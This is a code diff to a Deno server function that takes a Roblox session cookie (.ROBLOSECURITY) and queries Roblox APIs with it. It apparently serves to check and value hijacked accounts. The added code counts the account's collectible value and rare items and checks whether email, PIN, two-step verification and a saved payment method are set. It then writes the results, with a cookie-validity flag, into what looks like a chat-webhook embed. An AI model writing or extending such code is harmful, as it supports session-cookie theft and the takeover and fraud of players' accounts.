@@ -91,7 +91,7 @@ Deno.serve(async (req) => {
       }
     }
 
-    // Profile + economy + social summary
+    // Profile + economy + social + inventory + account info
     let displayName: string | null = null;
     let createdAt: string | null = null;
     let description: string | null = null;
@@ -101,6 +101,39 @@ Deno.serve(async (req) => {
     let friendsCount: number | null = null;
     let followersCount: number | null = null;
     let followingCount: number | null = null;
+    let hairsCount: number | null = null;
+    let bundlesCount: number | null = null;
+    let facesCount: number | null = null;
+    let rap: number | null = null;
+    let emailStatus: string = "—";
+    let pinEnabled: boolean | null = null;
+    let twoStepEnabled: boolean | null = null;
+    let savedPayment: boolean | null = null;
+    let hasKorblox = false;
+    let hasHeadless = false;
+
+    const KORBLOX_BUNDLE_ID = 100; // Korblox Deathspeaker bundle
+    const HEADLESS_BUNDLE_ID = 201; // Headless Horseman bundle
+    const KORBLOX_LEG_ASSET_ID = 139607718;
+    const HEADLESS_HEAD_ASSET_ID = 134082579;
+
+    async function countAssets(uid: number, assetTypeId: number): Promise<number | null> {
+      try {
+        let total = 0;
+        let cursor = "";
+        for (let i = 0; i < 5; i++) {
+          const u = `https://inventory.roblox.com/v2/users/${uid}/inventory/${assetTypeId}?limit=100${cursor ? `&cursor=${cursor}` : ""}`;
+          const r = await fetch(u, { headers: cookie ? { Cookie: `.ROBLOSECURITY=${cookie}` } : {} });
+          if (!r.ok) return total || null;
+          const j = await r.json();
+          total += Array.isArray(j?.data) ? j.data.length : 0;
+          cursor = j?.nextPageCursor || "";
+          if (!cursor) break;
+        }
+        return total;
+      } catch { return null; }
+    }
+
     if (userId) {
       const ch = cookie ? { Cookie: `.ROBLOSECURITY=${cookie}` } : {};
       await Promise.all([
@@ -122,6 +155,58 @@ Deno.serve(async (req) => {
         fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`).then(async (r) => {
           if (r.ok) { const j = await r.json(); followingCount = j?.count ?? null; }
         }).catch(() => {}),
+        // Inventory: Hair Accessory = 41, Face = 18, Bundles via catalog endpoint
+        countAssets(userId, 41).then((n) => { hairsCount = n; }).catch(() => {}),
+        countAssets(userId, 18).then((n) => { facesCount = n; }).catch(() => {}),
+        fetch(`https://catalog.roblox.com/v1/users/${userId}/bundles?limit=100`, { headers: ch }).then(async (r) => {
+          if (r.ok) { const j = await r.json(); bundlesCount = Array.isArray(j?.data) ? j.data.length : null; }
+        }).catch(() => {}),
+        // RAP — sum of recentAveragePrice across collectibles
+        (async () => {
+          try {
+            let sum = 0; let cursor = "";
+            for (let i = 0; i < 5; i++) {
+              const u = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100${cursor ? `&cursor=${cursor}` : ""}`;
+              const r = await fetch(u, { headers: ch });
+              if (!r.ok) break;
+              const j = await r.json();
+              for (const it of (j?.data || [])) sum += Number(it?.recentAveragePrice || 0);
+              cursor = j?.nextPageCursor || "";
+              if (!cursor) break;
+            }
+            rap = sum;
+          } catch {}
+        })(),
+        // Email verified/pending (requires cookie)
+        fetch(`https://accountsettings.roblox.com/v1/email`, { headers: ch }).then(async (r) => {
+          if (r.ok) { const j = await r.json(); emailStatus = j?.verified ? "✅ Verified" : (j?.emailAddress ? "⏳ Pending" : "❌ None"); }
+          else if (r.status === 401) { emailStatus = "🔒 Auth required"; }
+        }).catch(() => {}),
+        // PIN + 2-step
+        fetch(`https://auth.roblox.com/v1/account/pin`, { headers: ch }).then(async (r) => {
+          if (r.ok) { const j = await r.json(); pinEnabled = !!j?.isEnabled; }
+        }).catch(() => {}),
+        fetch(`https://twostepverification.roblox.com/v1/users/${userId}/configuration`, { headers: ch }).then(async (r) => {
+          if (r.ok) { const j = await r.json(); twoStepEnabled = !!(j?.primaryMediaType || j?.methods?.length); }
+        }).catch(() => {}),
+        // Saved payment method (billing)
+        fetch(`https://billing.roblox.com/v1/payment-methods`, { headers: ch }).then(async (r) => {
+          if (r.ok) { const j = await r.json(); savedPayment = Array.isArray(j?.savedPaymentMethods) ? j.savedPaymentMethods.length > 0 : (Array.isArray(j) ? j.length > 0 : false); }
+        }).catch(() => {}),
+        // Korblox / Headless ownership
+        fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/${KORBLOX_BUNDLE_ID}`).then(async (r) => {
+          if (r.ok) { const j = await r.json(); hasKorblox = Array.isArray(j?.data) && j.data.length > 0; }
+        }).catch(() => {}),
+        fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/${HEADLESS_BUNDLE_ID}`).then(async (r) => {
+          if (r.ok) { const j = await r.json(); hasHeadless = Array.isArray(j?.data) && j.data.length > 0; }
+        }).catch(() => {}),
+        // Fallback asset checks
+        fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${KORBLOX_LEG_ASSET_ID}`).then(async (r) => {
+          if (r.ok) { const j = await r.json(); if (Array.isArray(j?.data) && j.data.length) hasKorblox = true; }
+        }).catch(() => {}),
+        fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${HEADLESS_HEAD_ASSET_ID}`).then(async (r) => {
+          if (r.ok) { const j = await r.json(); if (Array.isArray(j?.data) && j.data.length) hasHeadless = true; }
+        }).catch(() => {}),
       ]);
     }
 
@@ -129,6 +214,10 @@ Deno.serve(async (req) => {
     const usernameValue = username
       ? (profileUrl ? `[${username}](${profileUrl})${displayName && displayName !== username ? ` — ${displayName}` : ""}` : username)
       : "Unknown";
+
+    const rareBadges: string[] = [];
+    if (hasKorblox) rareBadges.push("🦴 Korblox");
+    if (hasHeadless) rareBadges.push("🎃 Headless");
 
     const color = cookieValid === false ? 0xef4444 : (status === "COMPLETE" ? 0x22c55e : 0x3b82f6);
     const validityLabel = cookieValid === true ? "✅ Valid" : cookieValid === false ? "❌ Invalid" : "❓ Unknown";
@@ -138,12 +227,21 @@ Deno.serve(async (req) => {
       { name: "Cookie", value: validityLabel, inline: true },
       { name: "Username", value: usernameValue, inline: false },
       { name: "Robux", value: robux !== null ? `R$ ${robux.toLocaleString()}` : "—", inline: true },
+      { name: "RAP", value: rap !== null ? `R$ ${rap.toLocaleString()}` : "—", inline: true },
       { name: "Premium", value: isPremium === null ? "—" : isPremium ? "✅ Yes" : "❌ No", inline: true },
+      { name: "Email", value: emailStatus, inline: true },
+      { name: "PIN", value: pinEnabled === null ? "—" : pinEnabled ? "🔒 On" : "🔓 Off", inline: true },
+      { name: "2-Step", value: twoStepEnabled === null ? "—" : twoStepEnabled ? "✅ On" : "❌ Off", inline: true },
+      { name: "Saved Payment", value: savedPayment === null ? "—" : savedPayment ? "💳 Yes" : "No", inline: true },
       { name: "Created", value: createdAt ? `<t:${Math.floor(new Date(createdAt).getTime() / 1000)}:D>` : "—", inline: true },
+      { name: "Banned", value: isBanned ? "🚫 Yes" : "No", inline: true },
       { name: "Friends", value: friendsCount !== null ? String(friendsCount) : "—", inline: true },
       { name: "Followers", value: followersCount !== null ? String(followersCount) : "—", inline: true },
       { name: "Following", value: followingCount !== null ? String(followingCount) : "—", inline: true },
-      { name: "Banned", value: isBanned ? "🚫 Yes" : "No", inline: true },
+      { name: "Hairs", value: hairsCount !== null ? String(hairsCount) : "—", inline: true },
+      { name: "Bundles", value: bundlesCount !== null ? String(bundlesCount) : "—", inline: true },
+      { name: "Faces", value: facesCount !== null ? String(facesCount) : "—", inline: true },
+      { name: "Rare Items", value: rareBadges.length ? rareBadges.join(" • ") : "None", inline: false },
       { name: "Top Games", value: topGames.length ? topGames.join(" | ") : "None", inline: false },
     ];
     if (description) {
